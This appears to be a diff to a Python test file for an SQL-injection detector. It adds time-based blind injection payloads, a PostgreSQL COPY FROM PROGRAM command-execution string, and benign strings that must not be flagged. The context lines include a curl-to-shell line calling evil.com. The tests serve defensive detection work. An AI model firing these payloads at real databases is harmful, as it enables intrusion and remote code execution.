@@ -402,8 +402,13 @@ async def test_sqli_scorer_adds_to_memory():
         "WHERE SLEEP(5)",
         "1' AND BENCHMARK(10000000, MD5(1))--",
         "1' AND BENCHMARK(5000000, SHA1(1))--",
+        "1' OR BENCHMARK(1000000,RAND())--",
         "AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)",
         "1; BEGIN DBMS_LOCK.SLEEP(5); END;",
+        "1; BEGIN DBMS_LOCK.SLEEP(5.5); END;",
+        "';WAITFOR DELAY'0:0:5'--",
+        "'XOR(if(now()=sysdate(),sleep(5),0))XOR'",
+        "OR MAKE_SET(1=1,SLEEP(5))",
     ],
 )
 async def test_sqli_time_based_blind_detected(text: str, patch_central_database: MagicMock) -> None:
@@ -428,6 +433,7 @@ async def test_sqli_time_based_blind_detected(text: str, patch_central_database:
         "COPY users FROM PROGRAM 'curl https://evil.com/rce | sh'",
         "COPY cmd_exec(cmd_output) FROM PROGRAM 'id'",
         "COPY public.cmd_exec(col1, col2) FROM PROGRAM 'id'",
+        "CREATE TABLE t(c text); COPY t FROM PROGRAM 'id'",
     ],
 )
 async def test_sqli_file_command_execution_detected(text: str, patch_central_database: MagicMock) -> None:
@@ -452,6 +458,10 @@ async def test_sqli_file_command_execution_detected(text: str, patch_central_dat
         "import time\ntime.sleep(5)",
         "def benchmark(iterations, target_func): pass",
         "EXEC sp_executesql N'SELECT * FROM Users WHERE Id = @Id', N'@Id INT', @Id = 1",
+        "routine: eat, sleep (8), repeat",
+        "retry loop: curl, sleep(30), retry",
+        "await gather(task1, sleep(5))",
+        "Copy data from program 'Excel' into the sheet",
     ],
 )
 async def test_sqli_blind_and_rce_false_positives_prevented(text: str, patch_central_database: MagicMock) -> None:
